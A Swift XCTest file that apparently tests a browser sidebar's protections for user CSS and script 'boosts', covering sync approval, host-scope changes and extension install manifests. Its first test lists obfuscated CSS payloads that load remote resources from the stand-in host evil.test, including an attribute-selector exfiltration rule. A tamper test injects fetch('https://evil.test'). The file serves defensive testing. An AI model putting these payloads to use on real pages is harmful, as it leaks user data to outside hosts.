import XCTest
@testable import SidebarModel

/// Security RC-0.1.0-544 N-02 (boost CSS loads and approval) and F-12 (script approval at run time).
final class BoostCSSSecurityTests: XCTestCase {
    private let rule = BoostHostRule(host: "bank.test")
    private let page = URL(string: "https://bank.test/account")!

    func testEveryWayToNameARemoteResourceIsRefused() {
        let attacks = [
            "a{background:url(https://evil.test/x)}",
            "a{background:url( 'https://evil.test/x' )}",
            "a{background:URL(//evil.test/x)}",
            #"a{background:u\72l(https://evil.test/x)}"#,
            #"a{background:\75 rl(https://evil.test/x)}"#,
            #"a{background:url(https:\2f\2f evil.test/x)}"#,
            #"a{background:url("htt\70s://evil.test/x")}"#,
            "a{background:url(/same-origin/beacon)}",
            "a{background:url(beacon.png)}",
            "a{background:url(https:evil.test/x)}",
            #"a{background:url(\\evil.test/x)}"#,
            "a{background-image:image-set(\"https://evil.test/x\" 1x)}",
            "a{background-image:-webkit-image-set('//evil.test/x' 1x)}",
            "a{background-image:image-set(\"x.png\" 1x)}",
            "a{background-image:cross-fade(\"https://evil.test/x\", red 50%)}",
            ":root{--u:\"https://evil.test/x\"} a{background-image:image-set(var(--u) 1x)}",
            ":root{--u:\"x.png\"} a{background-image:image-set(var(--u) 1x)}",
            "a{background-image:image-set(attr(data-u) 1x)}",
            "a{background:src(\"https://evil.test/x\")}",
            "a{background:src(var(--u))}",
            "@import 'local.css'; a{}",
            "@IMPORT url(x.css); a{}",
            #"@\69mport "x.css"; a{}"#,
            "@font-face{font-family:x;src:url(https://evil.test/f.woff)}",
            "input[value^=a]{background:url(https://evil.test/?a)}",
            // A comment-looking pair inside strings must not hide what is between them.
            "a{content:\"/*\"} b{background:url(https://evil.test/x)} c{content:\"*/\"}",
            "a{content:\"https:/\\2f evil.test\"}",
        ]
        for css in attacks {
            XCTAssertTrue(BoostSecurity.validateCSS(css, allowInStyle: true).contains(.remoteImportInCSS), css)
            XCTAssertTrue(BoostSecurity.validateCSS(css, allowInStyle: false).contains(.remoteImportInCSS), "script CSS: \(css)")
            XCTAssertNil(BoostStyleCompiler.compileStylesheet(css), css)
        }
    }

    func testOrdinaryAndDataCSSStillPasses() {
        let fine = [
            "body { color: red; background: #fff; }",
            "a{background:url(data:image/png;base64,iVBORw0KGgo=)}",
            "a{background:url(\"data:image/svg+xml,%3Csvg%3E%3C/svg%3E\")}",
            "a{filter:url(#shadow)}",
            "a{background-image:image-set(\"data:image/png;base64,AAAA\" 1x)}",
            "a::before{content:\"Note: this is fine\"}",
            "/* url(https://evil.test/in-a-comment) */ a{color:red}",
            "a{font-family:\"Avenir Next\", sans-serif}",
            "@media (max-width: 600px) { a { display: none !important; } }",
            "@font-face{font-family:x;src:local(\"Helvetica\")}",
            "a{content:\"\\201C\"}",
        ]
        for css in fine {
            XCTAssertEqual(BoostSecurity.validateCSS(css, allowInStyle: true), [], css)
        }
    }

    func testCSSFromSyncAppliesOnlyAfterApprovalHere() {
        let store = SidebarStore(spaces: [Space(name: "Home")])
        let package = BoostPackage.newStyle(name: "Dark", hostScope: [rule], css: "body{color:red}")
        XCTAssertNil(store.addBoost(package, enabled: true))
        let tab = store.addTab(kind: .pinned, title: "Bank", url: page, in: store.spaces[0].id)
        XCTAssertEqual(store.activeBoostEntries(for: tab).first?.css, "body{color:red}", "a local boost applies")

        // Another Mac edits the CSS; it arrives through sync apply.
        var remote = package
        remote.styleBoost?.css = "body{color:blue}"
        let snapshot = applying(remote, onto: store)
        let synced = snapshot.boostLibrariesByProfileID[store.activeProfileID]!
        XCTAssertFalse(synced.styleApproved(synced.package(id: package.manifest.id)!))
        store.applySnapshot(snapshot)
        let entries = store.activeBoostEntries(for: store.tab(withID: tab.id) ?? tab)
        XCTAssertNil(entries.first?.css, "changed CSS waits for approval")
        XCTAssertTrue(BoostLibraryListing.rows(store.boostLibrary())[0].styleNeedsApproval)

        store.approveBoostStyle(packageID: package.manifest.id)
        XCTAssertEqual(store.activeBoostEntries(for: store.tab(withID: tab.id) ?? tab).first?.css, "body{color:blue}")
        XCTAssertFalse(BoostLibraryListing.rows(store.boostLibrary())[0].styleNeedsApproval)

        // A local save is approved as it stands.
        XCTAssertTrue(store.updateBoostStyleCSS(packageID: package.manifest.id, css: "body{color:green}"))
        XCTAssertEqual(store.activeBoostEntries(for: store.tab(withID: tab.id) ?? tab).first?.css?.contains("green"), true)
    }

    func testWideningHostsThroughSyncNeedsApprovalToo() {
        let store = SidebarStore(spaces: [Space(name: "Home")])
        let package = BoostPackage.newStyle(name: "Dark", hostScope: [BoostHostRule(host: "news.test")], css: "body{color:red}")
        XCTAssertNil(store.addBoost(package, enabled: true))
        var remote = package
        remote.manifest.hostScope.append(rule)
        store.applySnapshot(applying(remote, onto: store))
        let tab = store.addTab(kind: .pinned, title: "Bank", url: page, in: store.spaces[0].id)
        XCTAssertNil(store.activeBoostEntries(for: tab).first?.css)
    }

    func testLibrariesSavedBeforeStyleApprovalsKeepTheirCSS() throws {
        var library = ProfileBoostLibrary(profileID: UUID())
        let package = BoostPackage.newStyle(name: "Dark", hostScope: [rule], css: "body{color:red}")
        _ = BoostLibraryOps.add(package, to: &library, enabled: true)
        library.approvedStyleHashes = nil
        let legacy = try JSONDecoder().decode(ProfileBoostLibrary.self, from: JSONEncoder().encode(library))
        XCTAssertNil(legacy.approvedStyleHashes)
        let context = BoostTabContext(profileID: library.profileID, spaceID: nil, url: page)
        // RC-0.1.0-602 F-12: a missing map approves nothing; the migration happens once, at load.
        XCTAssertNil(BoostActivation.activeEntries(library: legacy, context: context).first?.css)
        let store = SidebarStore()
        var snapshot = store.makeSnapshot()
        var loaded = legacy
        loaded.profileID = store.activeProfileID
        snapshot.boostLibrariesByProfileID[store.activeProfileID] = loaded
        store.applySnapshot(snapshot)
        let migrated = try XCTUnwrap(store.makeSnapshot().boostLibrariesByProfileID[store.activeProfileID])
        XCTAssertNotNil(migrated.approvedStyleHashes, "saved with the sidebar from now on")
        let loadedContext = BoostTabContext(profileID: store.activeProfileID, spaceID: nil, url: page)
        XCTAssertEqual(BoostActivation.activeEntries(library: migrated, context: loadedContext).first?.css, "body{color:red}")
    }

    func testScriptRunsOnlyWithAMatchingApprovalNotOnTheFlagAlone() {
        var library = ProfileBoostLibrary(profileID: UUID())
        let package = BoostPackage.newScript(name: "Tweaks", hostScope: [rule], js: "console.log(1)")
        _ = BoostLibraryOps.add(package, to: &library, enabled: true)
        let context = BoostTabContext(profileID: library.profileID, spaceID: nil, url: page)
        XCTAssertEqual(BoostActivation.activeEntries(library: library, context: context).first?.scriptUserEnabled, false)

        XCTAssertTrue(BoostLibraryOps.setScriptUserEnabled(packageID: package.manifest.id, enabled: true, library: &library))
        XCTAssertEqual(BoostActivation.activeEntries(library: library, context: context).first?.scriptUserEnabled, true)

        // A process that edits sidebar.json: new code with the flag left on.
        var tampered = library
        tampered.packages[0].scriptBoost?.js = "fetch('https://evil.test')"
        XCTAssertEqual(BoostActivation.activeEntries(library: tampered, context: context).first?.scriptUserEnabled, false)
        // Or the flag set on code that was never approved.
        var flagged = ProfileBoostLibrary(profileID: library.profileID)
        _ = BoostLibraryOps.add(package, to: &flagged, enabled: true)
        flagged.packages[0].scriptBoost?.userScriptEnabled = true
        XCTAssertEqual(BoostActivation.activeEntries(library: flagged, context: context).first?.scriptUserEnabled, false)
    }

    func testSyncCannotAllowPrivateWindowsAndDeletedApprovalsArePruned() {
        let store = SidebarStore(spaces: [Space(name: "Home")])
        let package = BoostPackage.newScript(name: "Tweaks", hostScope: [rule], js: "console.log(1)")
        XCTAssertNil(store.addBoost(package, enabled: true))
        store.setBoostScriptUserEnabled(packageID: package.manifest.id, enabled: true)

        var records = SidebarSyncProjection.extract(store.makeSnapshot())
        let name = SyncRecordKind.boost.recordName(for: package.manifest.id)
        var install = store.boostLibrary().installation(for: package.manifest.id)!
        install.allowPrivate = true
        records[name]?.values["installation"] = SidebarSyncProjection.installationValue(install)
        let applied = SidebarSyncProjection.apply(payloads(records), onto: store.makeSnapshot())
        XCTAssertEqual(applied.boostLibrariesByProfileID[store.activeProfileID]?.installation(for: package.manifest.id)?.allowPrivate, false)

        records[name] = nil
        let removed = SidebarSyncProjection.apply(payloads(records), onto: store.makeSnapshot())
        let library = removed.boostLibrariesByProfileID[store.activeProfileID]!
        XCTAssertNil(library.approvedScriptHashes?[package.manifest.id])
        XCTAssertNil(library.approvedStyleHashes?[package.manifest.id])
    }

    // MARK: - Helpers

    private func payloads(_ records: [String: SyncRecordBody]) -> [String: SyncRecordPayload] {
        records.mapValues { body in
            SyncRecordPayload(kind: body.kind, fields: body.values.mapValues { SyncField(value: $0, stamp: SyncStamp(millis: 1, device: "B")) })
        }
    }

    /// The store's snapshot after another Mac's version of `package` arrives through sync.
    private func applying(_ package: BoostPackage, onto store: SidebarStore) -> SidebarSnapshot {
        var records = SidebarSyncProjection.extract(store.makeSnapshot())
        let name = SyncRecordKind.boost.recordName(for: package.manifest.id)
        records[name]?.values["package"] = try? SyncValue.encoding(package)
        return SidebarSyncProjection.apply(payloads(records), onto: store.makeSnapshot())
    }
}

/// Security RC-0.1.0-544 F-13: an install with no source manifest is never consent by ID.
final class ExtensionInstallManifestTests: XCTestCase {
    func testItemsWithoutASourceManifestAskForThePrompt() {
        let profile = UUID()
        // A build 500 queue item: enabledByDefault set, no manifest.
        let legacy = ExtensionReinstallQueue.Item(id: "abcdefghijklmnopabcdefghijklmnop", name: "Old", origin: .webStore,
                                                  profileID: profile, enabledByDefault: true)
        XCTAssertNil(legacy.sourceManifest)
        XCTAssertEqual(legacy.installManifestJSON, "{}")
        var item = legacy
        item.sourceManifest = ""
        XCTAssertEqual(item.installManifestJSON, "{}")
        item.sourceManifest = #"{"name":"New","version":"1"}"#
        XCTAssertEqual(item.installManifestJSON, #"{"name":"New","version":"1"}"#)
    }
}
